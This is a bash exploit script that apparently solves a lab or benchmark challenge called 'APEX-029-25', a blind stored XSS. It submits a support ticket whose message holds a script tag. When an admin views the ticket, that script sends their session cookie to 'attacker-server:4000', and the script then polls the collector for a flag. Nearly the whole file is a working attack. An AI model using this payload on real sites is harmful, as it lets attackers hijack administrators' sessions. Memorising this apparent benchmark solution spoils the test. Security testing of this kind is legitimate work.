#!/usr/bin/env bash
# APEX-029-25 — "Blind XSS with Out-of-Band Callback" (tags: xss, blind, stored)
#
# The ticket's message is rendered with EJS's unescaped `<%- %>`, and the
# session cookie is not `HttpOnly`. Neither is visible from outside: the
# rendering happens on the admin's page, which the person who filed the ticket
# never sees. That is what makes it blind, and why the payload has to carry its
# own way of reporting back.
#
# So the exploit is a submission and then a wait. h5i files the ticket and reads
# the collector; the script that runs in between belongs to the admin's browser.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
APP="${APP_URL:-$HOST:3000}"
COLLECTOR="${COLLECTOR_URL:-$HOST:4000}"
SESSION="apex029-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PAYLOAD='<script>fetch("http://attacker-server:4000/collect?cookie="+document.cookie)</script>'

"$H5I" browser open "$APP/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/tickets \
    --set header.Content-Type=application/json \
    --set "json.name=Reporter $$" \
    --set "json.email=reporter$$@example.test" \
    --set 'json.subject=Cannot log in' \
    --set "json.message=$PAYLOAD" >/dev/null

# The admin reads the queue on their own schedule, roughly every 30 seconds.
FOUND="no flag found"
for _ in $(seq 1 40); do
    "$H5I" browser navigate "$COLLECTOR/captured" --session "$SESSION" >/dev/null
    LATEST="$(last "$SESSION")"
    FOUND="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | flag)"
    [ "$FOUND" != "no flag found" ] && break
    sleep 3
done
printf '%s\n' "$FOUND"
